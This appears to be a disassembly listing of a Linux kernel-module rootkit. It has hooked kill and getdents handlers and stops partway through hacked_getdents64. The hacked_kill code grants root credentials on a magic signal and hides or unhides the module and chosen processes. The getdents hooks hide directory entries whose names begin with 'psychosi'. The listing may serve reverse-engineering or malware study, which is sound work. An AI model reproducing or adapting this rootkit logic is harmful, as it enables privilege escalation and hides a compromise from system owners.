┌ 377: sym.hacked_kill ();
│ afv: vars(1:sp[0x10..0x10])
│           0x080002c0      e800000000     call __fentry__             ; RELOC 32 __fentry__
│           ; CALL XREF from sym.hacked_kill @ 0x80002c0(x)
│           0x080002c5      55             push rbp
│           0x080002c6      4889e5         mov rbp, rsp                ; linux-headers-5.15.0-82-generic:265
│           0x080002c9      4154           push r12
│           0x080002cb      488b4768       mov rax, qword [rdi + 0x68]
│           0x080002cf      488b4f70       mov rcx, qword [rdi + 0x70]
│           0x080002d3      83f82e         cmp eax, 0x2e               ; linux-headers-5.15.0-82-generic:272 ; '.' ; 46
│       ┌─< 0x080002d6      0f84a4000000   je .bss
│       │   0x080002dc      83f840         cmp eax, 0x40               ; '@' ; 64
│      ┌──< 0x080002df      745d           je prepare_creds
│      ││   0x080002e1      48c7c20000..   mov rdx, 0                  ; RELOC 32 init_task
│      ││   0x080002e8      83f81f         cmp eax, 0x1f               ; 31
│     ┌───< 0x080002eb      7428           je 0x8000315
│     │││   0x080002ed      488b050000..   mov rax, qword [0x080002f4] ; [0x80002f4:8]=0xc4894100000000e8; RELOC 32 .bss @ 0x08001480 - 0x80002dc
│     │││   ; DATA XREF from sym.hacked_kill @ 0x80002ed(r)
│     │││   0x080002f4      e800000000     call __x86_indirect_thunk_rax ; linux-headers-5.15.0-82-generic:86; RELOC 32 __x86_indirect_thunk_rax
│     │││   ; CALL XREF from sym.hacked_kill @ 0x80002f4(x)
│     │││   0x080002f9      4189c4         mov r12d, eax
│     │││   ; CODE XREFS from sym.hacked_kill @ 0x800034c(x), 0x8000434(x)
│   ┌┌────> 0x080002fc      4489e0         mov eax, r12d
│   ╎╎│││   0x080002ff      4c8b65f8       mov r12, qword [var_8h]     ; linux-headers-5.15.0-82-generic:71
│   ╎╎│││   0x08000303      c9             leave
│  ┌──────< 0x08000304      e900000000     jmp __x86_return_thunk      ; RELOC 32 __x86_return_thunk
│  │╎╎│││   ; CODE XREFS from sym.hacked_kill @ 0x8000304(x), 0x8000329(x)
│ ┌└──────> 0x08000309      3b8808010000   cmp ecx, dword [rax + 0x108]
│ ╎┌──────< 0x0800030f      0f84b5000000   je 0x80003ca                ; linux-headers-5.15.0-82-generic:73
│ ╎│╎╎│││   ; CODE XREF from sym.hacked_kill @ 0x80002eb(x)
│ ╎│╎╎└───> 0x08000315      488b82b808..   mov rax, qword [rdx + 0x8b8]
│ ╎│╎╎ ││   0x0800031c      488d9048f7..   lea rdx, [rax - 0x8b8]
│ ╎│╎╎ ││   0x08000323      483d00000000   cmp rax, 0                  ; RELOC 32 init_task
│ └───────< 0x08000329      75de           jne 0x8000309
│  │╎╎ ││   ; CODE XREF from sym.hacked_kill @ 0x80003cd(x)
│  │╎╎┌───> 0x0800032b      41bcfdffffff   mov r12d, 0xfffffffd        ; 4294967293
│  │╎╎╎││   0x08000331      4489e0         mov eax, r12d
│  │╎╎╎││   0x08000334      4c8b65f8       mov r12, qword [var_8h]
│  │╎╎╎││   0x08000338      c9             leave
│ ┌───────< 0x08000339      e900000000     jmp __x86_return_thunk      ; RELOC 32 __x86_return_thunk
│ ││╎╎╎││   ; CODE XREFS from sym.hacked_kill @ 0x80002df(x), 0x8000339(x)
│ └────└──> 0x0800033e      e800000000     call prepare_creds          ; RELOC 32 prepare_creds
│  │╎╎╎ │   ; CALL XREF from sym.hacked_kill @ 0x800033e(x)
│  │╎╎╎ │   0x08000343      4531e4         xor r12d, r12d              ; linux-headers-5.15.0-82-generic:338
│  │╎╎╎ │   0x08000346      4889c7         mov rdi, rax
│  │╎╎╎ │   0x08000349      4885c0         test rax, rax
│  │└─────< 0x0800034c      74ae           je 0x80002fc
│  │ ╎╎ │   0x0800034e      48c7400400..   mov qword [rax + 4], 0
│  │ ╎╎ │   0x08000356      48c7400c00..   mov qword [rax + 0xc], 0
│  │ ╎╎ │   0x0800035e      48c7401400..   mov qword [rax + 0x14], 0   ; linux-headers-5.15.0-82-generic:112
│  │ ╎╎ │   0x08000366      48c7401c00..   mov qword [rax + 0x1c], 0
│  │ ╎╎ │   0x0800036e      e800000000     call commit_creds           ; RELOC 32 commit_creds
│  │ ╎╎ │   ; CALL XREF from sym.hacked_kill @ 0x800036e(x)
│  │ ╎╎ │   0x08000373      4489e0         mov eax, r12d
│  │ ╎╎ │   0x08000376      4c8b65f8       mov r12, qword [var_8h]
│  │ ╎╎ │   0x0800037a      c9             leave
│  │ ╎╎┌──< 0x0800037b      e900000000     jmp __x86_return_thunk      ; RELOC 32 __x86_return_thunk
│  │ ╎╎││   ; CODE XREFS from sym.hacked_kill @ 0x80002d6(x), 0x800037b(x)
│  │ ╎╎└└─> 0x08000380      66833d0000..   cmp word [0x08000388], 0    ; [0x8000388:2]=0x6374; RELOC 32 .bss @ 0x08001480 - 0x8000380
│  │ ╎╎     ; DATA XREF from sym.hacked_kill @ 0x8000380(r)
│  │ ╎╎ ┌─< 0x08000388      7463           je 0x80003ed                ; linux-headers-5.15.0-82-generic:148
│  │ ╎╎ │   0x0800038a      488b050000..   mov rax, qword [0x08000391] ; [0x8000391:8]=0xc748108b48e43145; RELOC 32 .bss @ 0x08001480 - 0x8000381
│  │ ╎╎ │   ; DATA XREF from sym.hacked_kill @ 0x800038a(r)
│  │ ╎╎ │   0x08000391      4531e4         xor r12d, r12d
│  │ ╎╎ │   0x08000394      488b10         mov rdx, qword [rax]        ; linux-headers-5.15.0-82-generic:298
│  │ ╎╎ │   0x08000397      48c7420800..   mov qword [rdx + 8], 0      ; RELOC 32 __this_module @ 0x08001100 + 0x8
│  │ ╎╎ │   0x0800039f      4889150000..   mov qword [0x080003a6], rdx ; [0x80003a5:8]=0x58948d23100; RELOC 32 __this_module @ 0x08001100 - 0x800039e
│  │ ╎╎ │   0x080003a6      31d2           xor edx, edx
│  │ ╎╎ │   0x080003a8      4889050000..   mov qword [0x080003af], rax ; [0x80003ae:8]=0x15896600; RELOC 32 __this_module @ 0x08001100 - 0x800039f
│  │ ╎╎ │   0x080003af      6689150000..   mov word [0x080003b6], dx   ; [0x80003b5:2]=0x4800; RELOC 32 .bss @ 0x08001480 - 0x80003ae
│  │ ╎╎ │   0x080003b6      48c7000000..   mov qword [rax], 0          ; linux-headers-5.15.0-82-generic:117; RELOC 32 __this_module @ 0x08001100 + 0x8
│  │ ╎╎ │   0x080003bd      4489e0         mov eax, r12d
│  │ ╎╎ │   0x080003c0      4c8b65f8       mov r12, qword [var_8h]
│  │ ╎╎ │   0x080003c4      c9             leave
│  │ ╎╎┌──< 0x080003c5      e900000000     jmp __x86_return_thunk      ; RELOC 32 __x86_return_thunk
│  │ ╎╎││   ; CODE XREFS from sym.hacked_kill @ 0x800030f(x), 0x80003c5(x)
│  └───└──> 0x080003ca      4885d2         test rdx, rdx
│    ╎└───< 0x080003cd      0f8458ffffff   je 0x800032b
│    ╎  │   0x080003d3      81b074f7ff..   xor dword [rax - 0x88c], 0x10000000
│    ╎  │   0x080003dd      4531e4         xor r12d, r12d
│    ╎  │   0x080003e0      4489e0         mov eax, r12d
│    ╎  │   0x080003e3      4c8b65f8       mov r12, qword [var_8h]
│    ╎  │   0x080003e7      c9             leave
│    ╎ ┌──< 0x080003e8      e900000000     jmp __x86_return_thunk      ; RELOC 32 __x86_return_thunk
│    ╎ ││   ; CODE XREFS from sym.hacked_kill @ 0x8000388(x), 0x80003e8(x)
│    ╎ └└─> 0x080003ed      488b050000..   mov rax, qword [0x080003f4] ; [0x80003f4:8]=0x4500000000158b48; RELOC 32 __this_module @ 0x08001100 - 0x80003e4
│    ╎      ; DATA XREF from sym.hacked_kill @ 0x80003ed(r)
│    ╎      0x080003f4      488b150000..   mov rdx, qword [0x080003fb] ; linux-headers-5.15.0-82-generic:177 ; [0x80003fb:8]=0x4808428948e43145; RELOC 32 __this_module @ 0x08001100 - 0x80003f3
│    ╎      ; DATA XREF from sym.hacked_kill @ 0x80003f4(r)
│    ╎      0x080003fb      4531e4         xor r12d, r12d
│    ╎      0x080003fe      48894208       mov qword [rdx + 8], rax
│    ╎      0x08000402      4889050000..   mov qword [0x08000409], rax ; [0x8000408:8]=0x100b84810894800; RELOC 32 .bss @ 0x08001480 - 0x80003f9
│    ╎      0x08000409      488910         mov qword [rax], rdx
│    ╎      0x0800040c      48b8000100..   movabs rax, 0xdead000000000100
│    ╎      0x08000416      4889050000..   mov qword [0x0800041d], rax ; [0x800041c:8]=0x5894822c0834800; RELOC 32 __this_module @ 0x08001100 - 0x8000415
│    ╎      0x0800041d      4883c022       add rax, 0x22               ; 34
│    ╎      0x08000421      4889050000..   mov qword [0x08000428], rax ; [0x8000427:8]=0x896600000001b800; RELOC 32 __this_module @ 0x08001100 - 0x8000418
│    ╎      0x08000428      b801000000     mov eax, 1
│    ╎      0x0800042d      6689050000..   mov word [0x08000434], ax   ; [0x8000433:2]=0xe900; RELOC 32 .bss @ 0x08001480 - 0x800042c
└    └────< 0x08000434      e9c3feffff     jmp 0x80002fc
            ;-- section..text:
            ;-- rip:
┌ 536: sym.hacked_getdents ();
│ afv: vars(2:sp[0x38..0x3c])
│           0x080000a0      e800000000     call __fentry__             ; RELOC 32 __fentry__ ; [03] -r-x section size 1923 named .text
│           ; CALL XREF from sym.hacked_getdents @ 0x80000a0(x)
│           0x080000a5      55             push rbp
│           0x080000a6      4889e5         mov rbp, rsp
│           0x080000a9      4157           push r15
│           0x080000ab      4156           push r14
│           0x080000ad      4155           push r13
│           0x080000af      4154           push r12                    ; linux-headers-5.15.0-82-generic:414
│           0x080000b1      53             push rbx
│           0x080000b2      4883ec10       sub rsp, 0x10
│           0x080000b6      488b4768       mov rax, qword [rdi + 0x68]
│           0x080000ba      4c8b6f70       mov r13, qword [rdi + 0x70] ; linux-headers-5.15.0-82-generic:415
│           0x080000be      488945d0       mov qword [var_30h], rax
│           0x080000c2      488b050000..   mov rax, qword [0x080000c9] ; linux-headers-5.15.0-82-generic:218 ; [0x80000c9:8]=0xfc08500000000e8; RELOC 32 .bss @ 0x08001480 - 0x80000a1
│           ; DATA XREF from sym.hacked_getdents @ 0x80000c2(r)
│           0x080000c9      e800000000     call __x86_indirect_thunk_rax; RELOC 32 __x86_indirect_thunk_rax
│           ; CALL XREF from sym.hacked_getdents @ 0x80000c9(x)
│           0x080000ce      85c0           test eax, eax
│       ┌─< 0x080000d0      0f8e7f010000   jle 0x8000255
│       │   0x080000d6      4c63e0         movsxd r12, eax             ; linux-headers-5.15.0-82-generic:180
│       │   0x080000d9      bec00d0000     mov esi, 0xdc0              ; 3520
│       │   0x080000de      4189c6         mov r14d, eax
│       │   0x080000e1      4c89e7         mov rdi, r12
│       │   0x080000e4      e800000000     call __kmalloc              ; linux-headers-5.15.0-82-generic:224; RELOC 32 __kmalloc
│       │   ; CALL XREF from sym.hacked_getdents @ 0x80000e4(x)
│       │   0x080000e9      4989c7         mov r15, rax
│       │   0x080000ec      4c89e0         mov rax, r12
│       │   0x080000ef      4d85ff         test r15, r15
│      ┌──< 0x080000f2      7513           jne 0x8000107
│      ││   0x080000f4      4883c410       add rsp, 0x10
│      ││   0x080000f8      5b             pop rbx
│      ││   0x080000f9      415c           pop r12
│      ││   0x080000fb      415d           pop r13
│      ││   0x080000fd      415e           pop r14
│      ││   0x080000ff      415f           pop r15
│      ││   0x08000101      5d             pop rbp
│     ┌───< 0x08000102      e900000000     jmp __x86_return_thunk      ; linux-headers-5.15.0-82-generic:92; RELOC 32 __x86_return_thunk
│     │││   ; CODE XREFS from sym.hacked_getdents @ 0x80000f2(x), 0x8000102(x)
│     └└──> 0x08000107      31d2           xor edx, edx
│       │   0x08000109      4c89e6         mov rsi, r12                ; linux-headers-5.15.0-82-generic:103
│       │   0x0800010c      4c89ff         mov rdi, r15
│       │   0x0800010f      4963de         movsxd rbx, r14d
│       │   0x08000112      e800000000     call __check_object_size    ; RELOC 32 __check_object_size
│       │   ; CALL XREF from sym.hacked_getdents @ 0x8000112(x)
│       │   0x08000117      488b75d0       mov rsi, qword [var_30h]    ; linux-headers-5.15.0-82-generic:100
│       │   0x0800011b      4c89e2         mov rdx, r12                ; linux-headers-5.15.0-82-generic:93
│       │   0x0800011e      4c89ff         mov rdi, r15
│       │   0x08000121      e800000000     call _copy_from_user        ; RELOC 32 _copy_from_user
│       │   ; CALL XREF from sym.hacked_getdents @ 0x8000121(x)
│       │   0x08000126      85c0           test eax, eax
│      ┌──< 0x08000128      0f85ed000000   jne kfree
│      ││   0x0800012e      65488b0425..   mov rax, qword gs:[0]       ; linux-headers-5.15.0-82-generic:92; RELOC 32 current_task
│      ││   0x08000137      488b80000c..   mov rax, qword [rax + 0xc00]
│      ││   0x0800013e      4d63ed         movsxd r13, r13d
│      ││   0x08000141      4531c0         xor r8d, r8d
│      ││   0x08000144      488b4020       mov rax, qword [rax + 0x20] ; linux-headers-5.15.0-82-generic:222
│      ││   0x08000148      488b4008       mov rax, qword [rax + 8]
│      ││   0x0800014c      4a8b04e8       mov rax, qword [rax + r13*8]
│      ││   0x08000150      488b4018       mov rax, qword [rax + 0x18]
│      ││   0x08000154      488b4030       mov rax, qword [rax + 0x30]
│      ││   0x08000158      4883784001     cmp qword [rax + 0x40], 1
│     ┌───< 0x0800015d      750d           jne 0x800016c
│     │││   0x0800015f      8b404c         mov eax, dword [rax + 0x4c]
│     │││   0x08000162      4531c0         xor r8d, r8d
│     │││   0x08000165      c1e814         shr eax, 0x14
│     │││   0x08000168      410f94c0       sete r8b
│     │││   ; CODE XREF from sym.hacked_getdents @ 0x800015d(x)
│     └───> 0x0800016c      49b9707379..   movabs r9, 0x69736f6863797370 ; linux-headers-5.15.0-82-generic:199 ; 'psychosi'
│      ││   0x08000176      4531ed         xor r13d, r13d
│      ││   0x08000179      4531e4         xor r12d, r12d
│      ││   ; CODE XREF from sym.hacked_getdents @ 0x80001ed(x)
│     ┌───> 0x0800017c      4b8d1c27       lea rbx, [r15 + r12]
│     ╎││   0x08000180      488d7b12       lea rdi, [rbx + 0x12]
│     ╎││   0x08000184      664585c0       test r8w, r8w
│    ┌────< 0x08000188      0f84ab000000   je 0x8000239
│    │╎││   0x0800018e      31f6           xor esi, esi
│    │╎││   0x08000190      ba0a000000     mov edx, 0xa
│    │╎││   0x08000195      448945cc       mov dword [var_34h], r8d
│    │╎││   0x08000199      e800000000     call simple_strtoul         ; linux-headers-5.15.0-82-generic:222; RELOC 32 simple_strtoul
│    │╎││   ; CALL XREF from sym.hacked_getdents @ 0x8000199(x)
│    │╎││   0x0800019e      448b45cc       mov r8d, dword [var_34h]
│    │╎││   0x080001a2      48c7c20000..   mov rdx, 0                  ; RELOC 32 init_task
│    │╎││   0x080001a9      49b9707379..   movabs r9, 0x69736f6863797370 ; 'psychosi'
│    │╎││   0x080001b3      85c0           test eax, eax
│    │╎││   0x080001b5      89c6           mov esi, eax                ; linux-headers-5.15.0-82-generic:202
│   ┌─────< 0x080001b7      750e           jne 0x80001c7
│  ┌──────< 0x080001b9      eb22           jmp 0x80001dd
│  │││╎││   ; CODE XREF from sym.hacked_getdents @ 0x80001db(x)
│ ┌───────> 0x080001bb      3bb008010000   cmp esi, dword [rax + 0x108] ; linux-headers-5.15.0-82-generic:244
│ ────────< 0x080001c1      0f84a3000000   je 0x800026a
│ ╎│││╎││   ; CODE XREF from sym.hacked_getdents @ 0x80001b7(x)
│ ╎│└─────> 0x080001c7      488b82b808..   mov rax, qword [rdx + 0x8b8]
│ ╎│ │╎││   0x080001ce      488d9048f7..   lea rdx, [rax - 0x8b8]
│ ╎│ │╎││   0x080001d5      483d00000000   cmp rax, 0                  ; RELOC 32 init_task
│ └───────< 0x080001db      75de           jne 0x80001bb
│  │ │╎││   ; CODE XREFS from sym.hacked_getdents @ 0x80001b9(x), 0x800023d(x), 0x8000243(x), 0x800026d(x), 0x800027a(x)
│ ┌└┌─────> 0x080001dd      4989dd         mov r13, rbx
│ ╎ ╎│╎││   ; CODE XREF from sym.hacked_getdents @ 0x8000253(x)
│ ╎┌──────> 0x080001e0      0fb74310       movzx eax, word [rbx + 0x10] ; linux-headers-5.15.0-82-generic:108
│ ╎╎╎│╎││   0x080001e4      4963de         movsxd rbx, r14d
│ ╎╎╎│╎││   0x080001e7      4901c4         add r12, rax
│ ╎╎╎│╎││   ; CODE XREF from sym.hacked_getdents @ 0x80002b1(x)
│ ────────> 0x080001ea      4c39e3         cmp rbx, r12                ; linux-headers-5.15.0-82-generic:207
│ ╎╎╎│└───< 0x080001ed      778d           ja 0x800017c
│ ╎╎╎│ ││   0x080001ef      4881fbffff..   cmp rbx, 0x7fffffff
│ ╎╎╎│┌───< 0x080001f6      0f87ba000000   ja 0x80002b6
│ ╎╎╎││││   0x080001fc      ba01000000     mov edx, 1
│ ╎╎╎││││   0x08000201      4889de         mov rsi, rbx
│ ╎╎╎││││   0x08000204      4c89ff         mov rdi, r15
│ ╎╎╎││││   0x08000207      e800000000     call __check_object_size    ; RELOC 32 __check_object_size
│ ╎╎╎││││   ; CALL XREF from sym.hacked_getdents @ 0x8000207(x)
│ ╎╎╎││││   0x0800020c      488b7dd0       mov rdi, qword [var_30h]
│ ╎╎╎││││   0x08000210      4889da         mov rdx, rbx
│ ╎╎╎││││   0x08000213      4c89fe         mov rsi, r15
│ ╎╎╎││││   0x08000216      e800000000     call _copy_to_user          ; linux-headers-5.15.0-82-generic:230; RELOC 32 _copy_to_user
│ ╎╎╎││││   ; CALL XREFS from sym.hacked_getdents @ 0x8000128(x), 0x8000216(x)
│ ╎╎╎││││   ; CODE XREF from section..text @ +0x218(x)
│ ╎╎╎││└──> 0x0800021b      4c89ff         mov rdi, r15
│ ╎╎╎││ │   0x0800021e      e800000000     call kfree                  ; RELOC 32 kfree
│ ╎╎╎││ │   ; CALL XREF from sym.hacked_getdents @ 0x800021e(x)
│ ╎╎╎││ │   0x08000223      4889d8         mov rax, rbx
│ ╎╎╎││ │   0x08000226      4883c410       add rsp, 0x10
│ ╎╎╎││ │   0x0800022a      5b             pop rbx
│ ╎╎╎││ │   0x0800022b      415c           pop r12                     ; linux-headers-5.15.0-82-generic:306
│ ╎╎╎││ │   0x0800022d      415d           pop r13
│ ╎╎╎││ │   0x0800022f      415e           pop r14                     ; linux-headers-5.15.0-82-generic:305
│ ╎╎╎││ │   0x08000231      415f           pop r15
│ ╎╎╎││ │   0x08000233      5d             pop rbp                     ; linux-headers-5.15.0-82-generic:306
│ ╎╎╎││┌──< 0x08000234      e900000000     jmp __x86_return_thunk      ; RELOC 32 __x86_return_thunk
│ ╎╎╎││││   ; CODE XREFS from sym.hacked_getdents @ 0x8000188(x), 0x8000234(x)
│ ╎╎╎└─└──> 0x08000239      4c394b12       cmp qword [rbx + 0x12], r9
│ ────────< 0x0800023d      759e           jne 0x80001dd
│ ╎╎╎ │ │   0x0800023f      807f0873       cmp byte [rdi + 8], 0x73    ; 's'
│ ────────< 0x08000243      7598           jne 0x80001dd
│ ╎╎╎ │ │   0x08000245      4c39fb         cmp rbx, r15
│ ╎╎╎ │┌──< 0x08000248      743b           je 0x8000285                ; linux-headers-5.15.0-82-generic:317
│ ╎╎╎ │││   ; CODE XREF from sym.hacked_getdents @ 0x8000283(x)
│ ╎╎╎┌────> 0x0800024a      0fb74310       movzx eax, word [rbx + 0x10]
│ ╎╎╎╎│││   0x0800024e      6641014510     add word [r13 + 0x10], ax
│ ╎└──────< 0x08000253      eb8b           jmp 0x80001e0
│ ╎ ╎╎│││   ; CODE XREF from sym.hacked_getdents @ 0x80000d0(x)
│ ╎ ╎╎││└─> 0x08000255      4883c410       add rsp, 0x10
│ ╎ ╎╎││    0x08000259      4898           cdqe                        ; linux-headers-5.15.0-82-generic:332
│ ╎ ╎╎││    0x0800025b      5b             pop rbx
│ ╎ ╎╎││    0x0800025c      415c           pop r12                     ; linux-headers-5.15.0-82-generic:338
│ ╎ ╎╎││    0x0800025e      415d           pop r13
│ ╎ ╎╎││    0x08000260      415e           pop r14
│ ╎ ╎╎││    0x08000262      415f           pop r15
│ ╎ ╎╎││    0x08000264      5d             pop rbp
│ ╎ ╎╎││┌─< 0x08000265      e900000000     jmp __x86_return_thunk      ; RELOC 32 __x86_return_thunk
│ ╎ ╎╎│││   ; CODE XREFS from sym.hacked_getdents @ 0x80001c1(x), 0x8000265(x)
│ ──────└─> 0x0800026a      4885d2         test rdx, rdx
│ └───────< 0x0800026d      0f846affffff   je 0x80001dd
│   ╎╎││    0x08000273      f68077f7ff..   test byte [rax - 0x889], 0x10
│   └─────< 0x0800027a      0f845dffffff   je 0x80001dd
│    ╎││    0x08000280      4c39fb         cmp rbx, r15
│    └────< 0x08000283      75c5           jne 0x800024a               ; linux-headers-5.15.0-82-generic:92
│     ││    ; CODE XREF from sym.hacked_getdents @ 0x8000248(x)
│     │└──> 0x08000285      410fb75710     movzx edx, word [r15 + 0x10]
│     │     0x0800028a      4c89ff         mov rdi, r15
│     │     0x0800028d      448945cc       mov dword [var_34h], r8d
│     │     0x08000291      4129d6         sub r14d, edx               ; linux-headers-5.15.0-82-generic:338
│     │     0x08000294      498d3417       lea rsi, [r15 + rdx]
│     │     0x08000298      4963de         movsxd rbx, r14d
│     │     0x0800029b      4889da         mov rdx, rbx
│     │     0x0800029e      e800000000     call memmove                ; linux-headers-5.15.0-82-generic:324; RELOC 32 memmove
│     │     ; CALL XREF from sym.hacked_getdents @ 0x800029e(x)
│     │     0x080002a3      448b45cc       mov r8d, dword [var_34h]    ; linux-headers-5.15.0-82-generic:256
│     │     0x080002a7      49b9707379..   movabs r9, 0x69736f6863797370 ; 'psychosi'
│ ────────< 0x080002b1      e934ffffff     jmp 0x80001ea
│     │     ; CODE XREF from sym.hacked_getdents @ 0x80001f6(x)
└     └───> 0x080002b6      0f0b           ud2                         ; linux-headers-5.15.0-82-generic:264
┌ 536: sym.hacked_getdents64 ();
│ afv: vars(2:sp[0x38..0x3c])
│           0x08000440      e800000000     call __fentry__             ; RELOC 32 __fentry__
│           ; CALL XREF from sym.hacked_getdents64 @ 0x8000440(x)
│           0x08000445      55             push rbp
│           0x08000446      4889e5         mov rbp, rsp
│           0x08000449      4157           push r15
│           0x0800044b      4156           push r14
│           0x0800044d      4155           push r13
│           0x0800044f      4154           push r12
│           0x08000451      53             push rbx
│           0x08000452      4883ec10       sub rsp, 0x10
│           0x08000456      488b4768       mov rax, qword [rdi + 0x68]
│           0x0800045a      4c8b6f70       mov r13, qword [rdi + 0x70]
│           0x0800045e      488945d0       mov qword [var_30h], rax
│           0x08000462      488b050000..   mov rax, qword [0x08000469] ; linux-headers-5.15.0-82-generic:151 ; [0x8000469:8]=0xfc08500000000e8; RELOC 32 .bss @ 0x08001480 - 0x8000449
│           ; DATA XREF from sym.hacked_getdents64 @ 0x8000462(r)
│           0x08000469      e800000000     call __x86_indirect_thunk_rax; RELOC 32 __x86_indirect_thunk_rax
│           ; CALL XREF from sym.hacked_getdents64 @ 0x8000469(x)
│           0x0800046e      85c0           test eax, eax
│       ┌─< 0x08000470      0f8e7f010000   jle 0x80005f5
│       │   0x08000476      4c63e0         movsxd r12, eax             ; linux-headers-5.15.0-82-generic:114
│       │   0x08000479      bec00d0000     mov esi, 0xdc0              ; 3520
│       │   0x0800047e      4189c6         mov r14d, eax
│       │   0x08000481      4c89e7         mov rdi, r12
│       │   0x08000484      e800000000     call __kmalloc              ; linux-headers-5.15.0-82-generic:157; RELOC 32 __kmalloc
│       │   ; CALL XREF from sym.hacked_getdents64 @ 0x8000484(x)
│       │   0x08000489      4989c7         mov r15, rax
│       │   0x0800048c      4c89e0         mov rax, r12
│       │   0x0800048f      4d85ff         test r15, r15
│      ┌──< 0x08000492      7513           jne 0x80004a7
│      ││   0x08000494      4883c410       add rsp, 0x10
│      ││   0x08000498      5b             pop rbx
│      ││   0x08000499      415c           pop r12
│      ││   0x0800049b      415d           pop r13
│      ││   0x0800049d      415e           pop r14
│      ││   0x0800049f      415f           pop r15
│      ││   0x080004a1      5d             pop rbp
│     ┌───< 0x080004a2      e900000000     jmp __x86_return_thunk      ; linux-headers-5.15.0-82-generic:92; RELOC 32 __x86_return_thunk
│     │││   ; CODE XREFS from sym.hacked_getdents64 @ 0x8000492(x), 0x80004a2(x)
│     └└──> 0x080004a7      31d2           xor edx, edx
│       │   0x080004a9      4c89e6         mov rsi, r12                ; linux-headers-5.15.0-82-generic:103
│       │   0x080004ac      4c89ff         mov rdi, r15
│       │   0x080004af      4963de         movsxd rbx, r14d
│       │   0x080004b2      e800000000     call __check_object_size    ; RELOC 32 __check_object_size
│       │   ; CALL XREF from sym.hacked_getdents64 @ 0x80004b2(x)
│       │   0x080004b7      488b75d0       mov rsi, qword [var_30h]    ; linux-headers-5.15.0-82-generic:100
│       │   0x080004bb      4c89e2         mov rdx, r12                ; linux-headers-5.15.0-82-generic:93
│       │   0x080004be      4c89ff         mov rdi, r15
│       │   0x080004c1      e800000000     call _copy_from_user        ; RELOC 32 _copy_from_user
│       │   ; CALL XREF from sym.hacked_getdents64 @ 0x80004c1(x)
│       │   0x080004c6      85c0           test eax, eax
│      ┌──< 0x080004c8      0f85ed000000   jne kfree
│      ││   0x080004ce      65488b0425..   mov rax, qword gs:[0]       ; linux-headers-5.15.0-82-generic:92; RELOC 32 current_task
│      ││   0x080004d7      488b80000c..   mov rax, qword [rax + 0xc00]
│      ││   0x080004de      4d63ed         movsxd r13, r13d
│      ││   0x080004e1      4531c0         xor r8d, r8d
│      ││   0x080004e4      488b4020       mov rax, qword [rax + 0x20] ; linux-headers-5.15.0-82-generic:155
│      ││   0x080004e8      488b4008       mov rax, qword [rax + 8]
│      ││   0x080004ec      4a8b04e8       mov rax, qword [rax + r13*8]
│      ││   0x080004f0      488b4018       mov rax, qword [rax + 0x18]
│      ││   0x080004f4      488b4030       mov rax, qword [rax + 0x30]
│      ││   0x080004f8      4883784001     cmp qword [rax + 0x40], 1
│     ┌───< 0x080004fd      750d           jne 0x800050c
│     │││   0x080004ff      8b404c         mov eax, dword [rax + 0x4c]
│     │││   0x08000502      4531c0         xor r8d, r8d
│     │││   0x08000505      c1e814         shr eax, 0x14
│     │││   0x08000508      410f94c0       sete r8b
│     │││   ; CODE XREF from sym.hacked_getdents64 @ 0x80004fd(x)
│     └───> 0x0800050c      49b9707379..   movabs r9, 0x69736f6863797370 ; linux-headers-5.15.0-82-generic:199 ; 'psychosi'
│      ││   0x08000516      4531ed         xor r13d, r13d
│      ││   0x08000519      4531e4         xor r12d, r12d
│      ││   ; CODE XREF from sym.hacked_getdents64 @ 0x800058d(x)
│     ┌───> 0x0800051c      4b8d1c27       lea rbx, [r15 + r12]
│     ╎││   0x08000520      488d7b13       lea rdi, [rbx + 0x13]
│     ╎││   0x08000524      664585c0       test r8w, r8w
│    ┌────< 0x08000528      0f84ab000000   je 0x80005d9
│    │╎││   0x0800052e      31f6           xor esi, esi
│    │╎││   0x08000530      ba0a000000     mov edx, 0xa
│    │╎││   0x08000535      448945cc       mov dword [var_34h], r8d
│    │╎││   0x08000539      e800000000     call simple_strtoul         ; linux-headers-5.15.0-82-generic:222; RELOC 32 simple_strtoul
│    │╎││   ; CALL XREF from sym.hacked_getdents64 @ 0x8000539(x)
│    │╎││   0x0800053e      448b45cc       mov r8d, dword [var_34h]
│    │╎││   0x08000542      48c7c20000..   mov rdx, 0                  ; RELOC 32 init_task
│    │╎││   0x08000549      49b9707379..   movabs r9, 0x69736f6863797370 ; 'psychosi'
│    │╎││   0x08000553      85c0           test eax, eax
│    │╎││   0x08000555      89c6           mov esi, eax                ; linux-headers-5.15.0-82-generic:136
│   ┌─────< 0x08000557      750e           jne 0x8000567
│  ┌──────< 0x08000559      eb22           jmp 0x800057d
│  │││╎││   ; CODE XREF from sym.hacked_getdents64 @ 0x800057b(x)
│ ┌───────> 0x0800055b      3bb008010000   cmp esi, dword [rax + 0x108] ; linux-headers-5.15.0-82-generic:177
│ ────────< 0x08000561      0f84a3000000   je 0x800060a
│ ╎│││╎││   ; CODE XREF from sym.hacked_getdents64 @ 0x8000557(x)
│ ╎│└─────> 0x08000567      488b82b808..   mov rax, qword [rdx + 0x8b8]
│ ╎│ │╎││   0x0800056e      488d9048f7..   lea rdx, [rax - 0x8b8]
│ ╎│ │╎││   0x08000575      483d00000000   cmp rax, 0                  ; RELOC 32 init_task
│ └───────< 0x0800057b      75de           jne 0x800055b
│  │ │╎││   ; CODE XREFS from sym.hacked_getdents64 @ 0x8000559(x), 0x80005dd(x), 0x80005e3(x), 0x800060d(x), 0x800061a(x)
│ ┌└┌─────> 0x0800057d      4989dd         mov r13, rbx
│ ╎ ╎│╎││   ; CODE XREF from sym.hacked_getdents64 @ 0x80005f3(x)
│ ╎┌──────> 0x08000580      0fb74310       movzx eax, word [rbx + 0x10] ; linux-headers-5.15.0-82-generic:108
│ ╎╎╎│╎││   0x08000584      4963de         movsxd rbx, r14d
│ ╎╎╎│╎││   0x08000587      4901c4         add r12, rax
│ ╎╎╎│╎││   ; CODE XREF from sym.hacked_getdents64 @ 0x8000651(x)
│ ────────> 0x0800058a      4c39e3         cmp rbx, r12                ; linux-headers-5.15.0-82-generic:207
│ ╎╎╎│└───< 0x0800058d      778d           ja 0x800051c
│ ╎╎╎│ ││   0x0800058f      4881fbffff..   cmp rbx, 0x7fffffff
│ ╎╎╎│┌───< 0x08000596      0f87ba000000   ja 0x8000656
│ ╎╎╎││││   0x0800059c      ba01000000     mov edx, 1
│ ╎╎╎││││   0x080005a1      4889de         mov rsi, rbx
│ ╎╎╎││││   0x080005a4      4c89ff         mov rdi, r15
│ ╎╎╎││││   0x080005a7      e800000000     call __check_object_size    ; RELOC 32 __check_object_size
│ ╎╎╎││││   ; CALL XREF from sym.hacked_getdents64 @ 0x80005a7(x)
